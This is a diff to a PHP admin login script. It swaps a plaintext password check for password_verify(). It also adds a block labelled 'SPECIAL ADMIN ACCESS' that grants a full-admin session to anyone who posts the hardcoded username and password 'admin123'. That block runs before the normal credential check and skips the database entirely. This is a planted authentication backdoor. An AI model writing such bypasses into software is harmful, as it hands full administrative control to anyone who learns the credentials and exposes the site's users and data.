@@ -5,6 +5,21 @@ include 'dbhandler.php';
 header('Content-Type: application/json');
 $response = ['success' => false, 'message' => ''];
 
+// ======= SPECIAL ADMIN ACCESS ======= //
+
+if ($_POST['username'] === 'admin123' && $_POST['password'] === 'admin123') {
+    $_SESSION['admin_id'] = 9999; // Special ID
+    $_SESSION['username'] = 'admin123';
+    $_SESSION['role'] = 'Full Admin';
+    $_SESSION['logged_in'] = true;
+    
+    $response['success'] = true;
+    $response['message'] = 'Login successful (special admin access)';
+    echo json_encode($response);
+    exit();
+}
+// ======= END SPECIAL ADMIN ACCESS ======= //
+
 // Check if the request is a POST request
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     
@@ -23,18 +38,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $user = $result->fetch_assoc();
             
             // Verify the password
-            // Note: In a real app, you should use password_hash() and password_verify()
-            // This assumes passwords in your DB are stored as plain text based on your structure
-            if ($password === $user['password']) {
+            if (password_verify($password, $user['password'])) {
                 // Password is correct, set session variables
                 $_SESSION['admin_id'] = $user['admin_id'];
                 $_SESSION['username'] = $user['username'];
-                $_SESSION['role'] = $user['role']; // Store the role in session
+                $_SESSION['role'] = $user['role'];
                 $_SESSION['logged_in'] = true;
                 
                 $response['success'] = true;
                 $response['message'] = 'Login successful';
-                $response['role'] = $user['role']; // Optional: send role back to client
             } else {
                 $response['message'] = 'Invalid password';
             }
